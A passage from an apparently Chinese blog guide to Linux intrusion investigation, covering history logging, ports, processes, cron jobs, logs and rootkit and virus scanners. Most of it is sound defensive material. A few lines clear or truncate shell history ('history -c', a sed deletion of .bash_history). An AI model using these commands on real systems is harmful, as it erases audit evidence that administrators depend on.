class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">1、root 用户的历史命令</span><br><span class="line">histroy</span><br><span class="line">2、打开 /home 各帐号目录下的 .bash_history，查看普通帐号执行的历史命令。</span><br><span class="line">为历史的命令增加登录的 IP 地址、执行命令时间等信息：</span><br><span class="line">1）保存1万条命令</span><br><span class="line">sed -i &#x27;s/^HISTSIZE=1000/HISTSIZE=10000/g&#x27; /etc/profile</span><br><span class="line">有些系统 不会在这个地方，可以用grep -r HISTSIZE /etc 进行查看</span><br><span class="line"></span><br><span class="line">root@ubuntu:~# grep -r HISTSIZE /etc</span><br><span class="line">/etc/skel/.bashrc:# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)</span><br><span class="line">/etc/skel/.bashrc:HISTSIZE=1000</span><br><span class="line"></span><br><span class="line">然后对应的进行修改文件</span><br><span class="line"></span><br><span class="line">2）在/etc/profile的文件尾部添加如下行数配置信息：</span><br><span class="line">######jiagu history xianshi#########</span><br><span class="line">USER_IP=`who -u am i 2&gt;/dev/null | awk &#x27;&#123;print $NF&#125;&#x27; | sed -e &#x27;s/[()]//g&#x27;`</span><br><span class="line">if [ &quot;$USER_IP&quot; = &quot;&quot; ]</span><br><span class="line">then</span><br><span class="line">USER_IP=`hostname`</span><br><span class="line">fi</span><br><span class="line">export HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;</span><br><span class="line">shopt -s histappend</span><br><span class="line">export PROMPT_COMMAND=&quot;history -a&quot;</span><br><span class="line">######### jiagu history xianshi ##########</span><br><span class="line">3）source /etc/profile 让配置生效</span><br><span class="line">生成效果： 1  2018-07-10 19:45:39 192.168.204.1 root source /etc/profile</span><br><span class="line">3、历史操作命令的清除：history -c</span><br><span class="line">但此命令并不会清除保存在文件中的记录，因此需要手动删除 .bash_profile 文件中的记录。</span><br></pre></td></tr></table></figure><p><strong>入侵排查：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">进入用户目录下，导出历史命令。</span><br><span class="line">cat .bash_history &gt;&gt; history.txt</span><br></pre></td></tr></table></figure><h5 id="1-3-检查异常端口"><a href="#1-3-检查异常端口" class="headerlink" title="1.3 检查异常端口"></a>1.3 检查异常端口</h5><p>使用 netstat 网络连接命令，分析可疑端口、IP、PID</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp | more    需要安装这个命令  apt install net-tools</span><br><span class="line"></span><br><span class="line">查看下 pid 所对应的进程文件路径，</span><br><span class="line">运行 ls -l /proc/$PID/exe 或 file /proc/$PID/exe（$PID 为对应的 pid 号）</span><br></pre></td></tr></table></figure><h5 id="1-4-检查异常进程"><a href="#1-4-检查异常进程" class="headerlink" title="1.4 检查异常进程"></a>1.4 检查异常进程</h5><p>使用 ps 命令，分析进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep pid </span><br></pre></td></tr></table></figure><h5 id="1-5-检查开机启动项"><a href="#1-5-检查开机启动项" class="headerlink" title="1.5 检查开机启动项"></a>1.5 检查开机启动项</h5><p><strong>基本使用：</strong></p><p>系统运行级别示意图：</p><table><thead><tr><th align="center">运行级别</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">关机</td></tr><tr><td align="center">1</td><td align="center">单用户模式，可以想象为windows的安全模式，主要用于系统修复</td></tr><tr><td align="center">2</td><td align="center">不完全的命令行模式，不含NFS服务</td></tr><tr><td align="center">3</td><td align="center">完全的命令行模式，就是标准字符界面</td></tr><tr><td align="center">4</td><td align="center">系统保留</td></tr><tr><td align="center">5</td><td align="center">图形模式</td></tr><tr><td align="center">6</td><td align="center">重启动</td></tr></tbody></table><p>查看运行级别命令 <code>runlevel</code></p><p>系统默认允许级别</p><pre><code>vi  /etc/inittabid=3：initdefault  #系统开机后直接进入哪个运行级别</code></pre><p>开机启动配置文件</p><pre><code>/etc/rc.local/etc/rc.d/rc[0~6].d</code></pre><p>例子：当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在 &#x2F;etc&#x2F;init.d 目录下，然后在 &#x2F;etc&#x2F;rc.d&#x2F;rc*.d 文件中建立软链接即可。</p><p>注：此中的 * 代表 0,1,2,3,4,5,6 这七个等级</p><pre><code>root@localhost ~]# ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh</code></pre><p>此处sshd是具体服务的脚本文件，S100ssh是其软链接，S开头代表加载时自启动；如果是K开头的脚本文件，代表运行级别加载时需要关闭的。</p><p><strong>入侵排查：</strong></p><p>启动项文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">more /etc/rc.local</span><br><span class="line">/etc/rc.d/rc[0~6].d</span><br><span class="line">ls -l /etc/rc.d/rc3.d/</span><br></pre></td></tr></table></figure><h5 id="1-6-检查定时任务"><a href="#1-6-检查定时任务" class="headerlink" title="1.6 检查定时任务"></a>1.6 检查定时任务</h5><p><strong>基本使用</strong></p><p>1、利用 crontab 创建计划任务</p><ul><li><p>基本命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">crontab -l   列出某个用户cron服务的详细内容</span><br><span class="line"></span><br><span class="line">Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/root</span><br><span class="line"></span><br><span class="line">crontab -r   删除每个用户cront任务(谨慎：删除所有的计划任务)</span><br><span class="line"></span><br><span class="line">crontab -e   使用编辑器编辑当前的crontab文件 </span><br><span class="line"></span><br><span class="line">如：*/1 * * * * echo &quot;hello world&quot; &gt;&gt; /tmp/test.txt 每分钟写入文件</span><br></pre></td></tr></table></figure></li></ul><p>2、利用 anacron 命令实现异步定时任务调度</p><ul><li><p>使用案例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">每天运行 /home/backup.sh 脚本：</span><br><span class="line">vi /etc/anacrontab </span><br><span class="line">@daily    10    example.daily   /bin/bash /home/backup.sh</span><br><span class="line">当机器在 backup.sh 期望被运行时是关机的，anacron会在机器开机十分钟之后运行它，而不用再等待 7天。</span><br></pre></td></tr></table></figure></li></ul><p><strong>入侵排查</strong></p><p>重点关注以下目录中是否存在恶意脚本</p><pre><code>/var/spool/cron/* /etc/crontab/etc/cron.d/*/etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/*/etc/cron.weekly//etc/anacrontab/var/spool/anacron/*</code></pre><p>小技巧：</p><pre><code>more /etc/cron.daily/*  查看目录下所有文件</code></pre><h5 id="1-7-检查服务"><a href="#1-7-检查服务" class="headerlink" title="1.7 检查服务"></a>1.7 检查服务</h5><p><strong>服务自启动</strong></p><p>第一种修改方法：</p><pre><code>chkconfig [--level 运行级别] [独立服务名] [on|off]chkconfig –level  2345 httpd on  开启自启动chkconfig httpd on （默认level是2345）</code></pre><p>第二种修改方法：</p><pre><code>修改 /etc/re.d/rc.local 文件  加入 /etc/init.d/httpd start</code></pre><p>第三种修改方法：</p><p>使用 ntsysv 命令管理自启动，可以管理独立服务和 xinetd 服务。</p><p><strong>入侵排查</strong></p><p>1、查询已安装的服务：</p><p>RPM 包安装的服务</p><pre><code>chkconfig  --list  查看服务自启动状态，可以看到所有的RPM包安装的服务ps aux | grep crond 查看当前服务系统在3与5级别下的启动项 中文环境chkconfig --list | grep &quot;3:启用\|5:启用&quot;英文环境chkconfig --list | grep &quot;3:on\|5:on&quot;</code></pre><p>源码包安装的服务</p><pre><code>查看服务安装位置 ，一般是在/user/local/service httpd start搜索/etc/rc.d/init.d/  查看是否存在</code></pre><h5 id="1-8-检查异常文件"><a href="#1-8-检查异常文件" class="headerlink" title="1.8 检查异常文件"></a>1.8 检查异常文件</h5><p>1、查看敏感目录，如&#x2F;tmp目录下的文件，同时注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性</p><p>2、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p><p>​可以使用find命令来查找，如  find &#x2F;opt -iname “*” -atime 1 -type f 找出 &#x2F;opt 下一天前访问过的文件</p><p>3、针对可疑文件可以使用 stat 进行创建修改时间。</p><h5 id="1-9-检查系统日志"><a href="#1-9-检查系统日志" class="headerlink" title="1.9 检查系统日志"></a>1.9 检查系统日志</h5><p>日志默认存放位置：&#x2F;var&#x2F;log&#x2F;</p><p>查看日志配置情况：more &#x2F;etc&#x2F;rsyslog.conf</p><table><thead><tr><th align="center">日志文件</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">&#x2F;var&#x2F;log&#x2F;cron</td><td align="center">记录了系统定时任务相关的日志</td></tr><tr><td align="center">&#x2F;var&#x2F;log&#x2F;cups</td><td align="center">记录打印信息的日志</td></tr><tr><td align="center">&#x2F;var&#x2F;log&#x2F;dmesg</td><td align="center">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td></tr><tr><td align="center">&#x2F;var&#x2F;log&#x2F;mailog</td><td align="center">记录邮件信息</td></tr><tr><td align="center">&#x2F;var&#x2F;log&#x2F;message</td><td align="center">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td></tr><tr><td align="center">&#x2F;var&#x2F;log&#x2F;btmp</td><td align="center">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td></tr><tr><td align="center">&#x2F;var&#x2F;log&#x2F;lastlog</td><td align="center">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td></tr><tr><td align="center">&#x2F;var&#x2F;log&#x2F;wtmp</td><td align="center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td></tr><tr><td align="center">&#x2F;var&#x2F;log&#x2F;utmp</td><td align="center">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td></tr><tr><td align="center">&#x2F;var&#x2F;log&#x2F;secure</td><td align="center">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td></tr></tbody></table><p>日志分析技巧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1、定位有多少IP在爆破主机的root帐号：    </span><br><span class="line">grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">定位有哪些IP在爆破：</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line"></span><br><span class="line">爆破用户名字典是什么？</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;|uniq -c|sort -nr</span><br><span class="line"> </span><br><span class="line">2、登录成功的IP有哪些： </span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">登录成功的日期、用户名、IP：</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27; </span><br><span class="line"></span><br><span class="line">3、增加一个用户kali日志：</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali</span><br><span class="line">, shell=/bin/bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br><span class="line">#grep &quot;useradd&quot; /var/log/secure </span><br><span class="line"></span><br><span class="line">4、删除用户kali日志：</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete user &#x27;kali&#x27;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class="line"># grep &quot;userdel&quot; /var/log/secure</span><br><span class="line"></span><br><span class="line">5、su切换用户：</span><br><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)</span><br><span class="line"></span><br><span class="line">sudo授权执行:</span><br><span class="line">sudo -l</span><br><span class="line">Jul 10 00:43:09 localhost sudo:    good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now</span><br></pre></td></tr></table></figure><h4 id="0x02-工具篇"><a href="#0x02-工具篇" class="headerlink" title="0x02 工具篇"></a>0x02 工具篇</h4><h5 id="2-1-Rootkit查杀"><a href="#2-1-Rootkit查杀" class="headerlink" title="2.1 Rootkit查杀"></a>2.1 Rootkit查杀</h5><ul><li><p>chkrootkit  </p><p>网址：<a href="http://www.chkrootkit.org/">http://www.chkrootkit.org</a> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">使用方法：</span><br><span class="line">wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz</span><br><span class="line">tar zxvf chkrootkit.tar.gz</span><br><span class="line">cd chkrootkit-0.52</span><br><span class="line">make sense</span><br><span class="line">#编译完成没有报错的话执行检查</span><br><span class="line">./chkrootkit</span><br></pre></td></tr></table></figure></li><li><p>rkhunter</p><p>网址：<a href="http://rkhunter.sourceforge.net/">http://rkhunter.sourceforge.net</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用方法：</span><br><span class="line">Wget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz</span><br><span class="line">tar -zxvf rkhunter-1.4.4.tar.gz</span><br><span class="line">cd rkhunter-1.4.4</span><br><span class="line">./installer.sh --install</span><br><span class="line">rkhunter -c</span><br></pre></td></tr></table></figure></li></ul><h5 id="2-2-病毒查杀"><a href="#2-2-病毒查杀" class="headerlink" title="2.2 病毒查杀"></a>2.2 病毒查杀</h5><ul><li><p>Clamav</p><p>网址：<a href="http://www.clamav.net/download.html">http://www.clamav.net/download.html</a> </p><p>安装方式一： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">1、安装 zlib：</span><br><span class="line">wget http://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz </span><br><span class="line">tar -zxvf  zlib-1.2.7.tar.gz</span><br><span class="line">cd zlib-1.2.7</span><br><span class="line">#安装一下gcc编译环境： yum install gcc</span><br><span class="line">CFLAGS=&quot;-O3 -fPIC&quot; ./configure --prefix= /usr/local/zlib/</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">2、添加用户组 clamav 和组成员 clamav：</span><br><span class="line">groupadd clamav</span><br><span class="line">useradd -g clamav -s /bin/false -c &quot;Clam AntiVirus&quot; clamav</span><br><span class="line"></span><br><span class="line">3、安装 Clamav</span><br><span class="line">tar –zxvf clamav-0.97.6.tar.gz</span><br><span class="line">cd clamav-0.97.6</span><br><span class="line">./configure --prefix=/opt/clamav --disable-clamav -with-zlib=/usr/local/zlib</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">4、配置 Clamav</span><br><span class="line">mkdir /opt/clamav/logs</span><br><span class="line">mkdir /opt/clamav/updata</span><br><span class="line">touch /opt/clamav/logs/freshclam.log</span><br><span class="line">touch /opt/clamav/logs/clamd.log</span><br><span class="line">cd /opt/clamav/logs</span><br><span class="line">chown clamav:clamav clamd.log</span><br><span class="line">chown clamav:clamav freshclam.log</span><br><span class="line"></span><br><span class="line">5、ClamAV 使用：</span><br><span class="line"> /opt/clamav/bin/freshclam 升级病毒库</span><br><span class="line">./clamscan –h 查看相应的帮助信息</span><br><span class="line">./clamscan -r /home  扫描所有用户的主目录就使用</span><br><span class="line">./clamscan -r --bell -i /bin  扫描bin目录并且显示有问题的文件的扫描结果</span><br></pre></td></tr></table></figure><p>安装方式二： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#安装</span><br><span class="line">yum install -y clamav</span><br><span class="line">#更新病毒库</span><br><span class="line">freshclam</span><br><span class="line">#扫描方法</span><br><span class="line">clamscan -r /etc --max-dir-recursion=5 -l /root/etcclamav.log</span><br><span class="line">clamscan -r /bin --max-dir-recursion=5 -l /root/binclamav.log</span><br><span class="line">clamscan -r /usr --max-dir-recursion=5 -l /root/usrclamav.log</span><br><span class="line">#扫描并杀毒</span><br><span class="line">clamscan -r  --remove  /usr/bin/bsd-port</span><br><span class="line">clamscan -r  --remove  /usr/bin/</span><br><span class="line">clamscan -r --remove  /usr/local/zabbix/sbin</span><br><span class="line">#查看日志发现</span><br><span class="line">cat /root/usrclamav.log |grep FOUND</span><br></pre></td></tr></table></figure></li></ul><h5 id="2-3-webshell查杀"><a href="#2-3-webshell查杀" class="headerlink" title="2.3 webshell查杀"></a>2.3 webshell查杀</h5><p>Linux 版：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">河马 WebShell 查杀：http://www.shellpub.com</span><br></pre></td></tr></table></figure><h5 id="2-4-RPM-check-检查"><a href="#2-4-RPM-check-检查" class="headerlink" title="2.4 RPM check 检查"></a>2.4 RPM check 检查</h5><p>系统完整性可以通过rpm自带的-Va来校验检查所有的rpm软件包，查看哪些命令是否被替换了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rpm -Va &gt; rpm.log</span><br></pre></td></tr></table></figure><p>如果一切均校验正常将不会产生任何输出，如果有不一致的地方，就会显示出来，输出格式是8位长字符串，每个字符都用以表示文件与RPM数据库中一种属性的比较结果 ，如果是. (点) 则表示测试通过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">验证内容中的8个信息的具体内容如下：</span><br><span class="line">S         文件大小是否改变</span><br><span class="line">M         文件的类型或文件的权限（rwx）是否被改变</span><br><span class="line">5         文件MD5校验是否改变（可以看成文件内容是否改变）</span><br><span class="line">D         设备中，从代码是否改变</span><br><span class="line">L         文件路径是否改变</span><br><span class="line">U         文件的属主（所有者）是否改变</span><br><span class="line">G         文件的属组是否改变</span><br><span class="line">T         文件的修改时间是否改变</span><br></pre></td></tr></table></figure><p>如果命令被替换了，如果还原回来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">文件提取还原案例：</span><br><span class="line">rpm  -qf /bin/ls  查询 ls 命令属于哪个软件包</span><br><span class="line">mv  /bin/ls /tmp  先把 ls 转移到 tmp 目录下，造成 ls 命令丢失的假象</span><br><span class="line">rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls 提取 rpm 包中 ls 命令到当前目录的 /bin/ls 下</span><br><span class="line">cp /root/bin/ls  /bin/ 把 ls 命令复制到 /bin/ 目录 修复文件丢失</span><br></pre></td></tr></table></figure><h5 id="2-5-Linux安全检查脚本"><a href="#2-5-Linux安全检查脚本" class="headerlink" title="2.5 Linux安全检查脚本"></a>2.5 Linux安全检查脚本</h5><p>Github 项目地址：</p><p><a href="https://github.com/grayddq/GScan">https://github.com/grayddq/GScan</a></p><p><a href="https://github.com/ppabc/security_check">https://github.com/ppabc/security_check</a></p><p><a href="https://github.com/T0xst/linux">https://github.com/T0xst/linux</a></p><h3 id="Linux日志分析"><a href="#Linux日志分析" class="headerlink" title="Linux日志分析"></a>Linux日志分析</h3><h4 id="0x00-前言-1"><a href="#0x00-前言-1" class="headerlink" title="0x00 前言"></a>0x00 前言</h4><p>Linux系统拥有非常灵活和强大的日志功能，可以保存几乎所有的操作记录，并可以从中检索出我们需要的信息。 本文简介一下Linux系统日志及日志分析技巧。</p><h4 id="0x01-日志简介"><a href="#0x01-日志简介" class="headerlink" title="0x01 日志简介"></a>0x01 日志简介</h4><p>日志默认存放位置：&#x2F;var&#x2F;log&#x2F;</p><p>查看日志配置情况：more &#x2F;etc&#x2F;rsyslog.conf</p><table><thead><tr><th align="center">日志文件</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">&#x2F;var&#x2F;log&#x2F;cron</td><td align="center">记录了系统定时任务相关的日志</td></tr><tr><td align="center">&#x2F;var&#x2F;log&#x2F;cups</td><td align="center">记录打印信息的日志</td></tr><tr><td align="center">&#x2F;var&#x2F;log&#x2F;dmesg</td><td align="center">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td></tr><tr><td align="center">&#x2F;var&#x2F;log&#x2F;mailog</td><td align="center">记录邮件信息</td></tr><tr><td align="center">&#x2F;var&#x2F;log&#x2F;message</td><td align="center">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td></tr><tr><td align="center">&#x2F;var&#x2F;log&#x2F;btmp</td><td align="center">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td></tr><tr><td align="center">&#x2F;var&#x2F;log&#x2F;lastlog</td><td align="center">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td></tr><tr><td align="center">&#x2F;var&#x2F;log&#x2F;wtmp</td><td align="center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td></tr><tr><td align="center">&#x2F;var&#x2F;log&#x2F;utmp</td><td align="center">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td></tr><tr><td align="center">&#x2F;var&#x2F;log&#x2F;secure</td><td align="center">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td></tr></tbody></table><p>比较重要的几个日志：<br>登录失败记录：&#x2F;var&#x2F;log&#x2F;btmp     &#x2F;&#x2F;lastb<br>最后一次登录：&#x2F;var&#x2F;log&#x2F;lastlog  &#x2F;&#x2F;lastlog<br>登录成功记录: &#x2F;var&#x2F;log&#x2F;wtmp     &#x2F;&#x2F;last<br>登录日志记录：&#x2F;var&#x2F;log&#x2F;secure   </p><p>​目前登录用户信息：&#x2F;var&#x2F;run&#x2F;utmp  &#x2F;&#x2F;w、who、users</p><p>​历史命令记录：history<br>​仅清理当前用户： history -c</p><h4 id="0x02-日志分析技巧"><a href="#0x02-日志分析技巧" class="headerlink" title="0x02 日志分析技巧"></a>0x02 日志分析技巧</h4><h5 id="A、常用的shell命令"><a href="#A、常用的shell命令" class="headerlink" title="A、常用的shell命令"></a>A、常用的shell命令</h5><p>Linux下常用的shell命令如：find、grep 、egrep、awk、sed</p><p>小技巧：</p><p>1、grep显示前后几行信息:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">标准unix/linux下的grep通过下面參数控制上下文：</span><br><span class="line">​grep -C 5 foo file 显示file文件里匹配foo字串那行以及上下5行</span><br><span class="line">​grep -B 5 foo file 显示foo及前5行</span><br><span class="line">​grep -A 5 foo file 显示foo及后5行</span><br><span class="line">​查看grep版本号的方法是</span><br><span class="line">​grep -V</span><br></pre></td></tr></table></figure><p>2、grep 查找含有某字符串的所有文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">grep -rn &quot;hello,world!&quot; </span><br><span class="line">* : 表示当前目录所有文件，也可以是某个文件名</span><br><span class="line">-r 是递归查找</span><br><span class="line">-n 是显示行号</span><br><span class="line">-R 查找所有文件包含子目录</span><br><span class="line">-i 忽略大小写</span><br></pre></td></tr></table></figure><p>3、如何显示一个文件的某几行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat input_file | tail -n +1000 | head -n 2000</span><br><span class="line">#从第1000行开始，显示2000行。即显示1000~2999行</span><br></pre></td></tr></table></figure><p>4、find &#x2F;etc -name init </p><pre><code>//在目录/etc中查找文件init</code></pre><p>5、只是显示&#x2F;etc&#x2F;passwd的账户</p><pre><code>`cat /etc/passwd |awk  -F &#39;:&#39;  &#39;&#123;print $1&#125;&#39;`  //awk -F指定域分隔符为&#39;:&#39;，将记录按指定的域分隔符划分域，填充域，​$0则表示所有域,$1表示第一个域,​$n表示第n个域。</code></pre><p>6、sed -i ‘153,$d’ .bash_history</p><pre><code>删除历史操作记录，只保留前153行</code></pre><h5 id="B、日志分析技巧"><a href="#B、日志分析技巧" class="headerlink" title="B、日志分析技巧"></a>B、日志分析技巧</h5><p><strong>A、&#x2F;var&#x2F;log&#x2F;secure</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 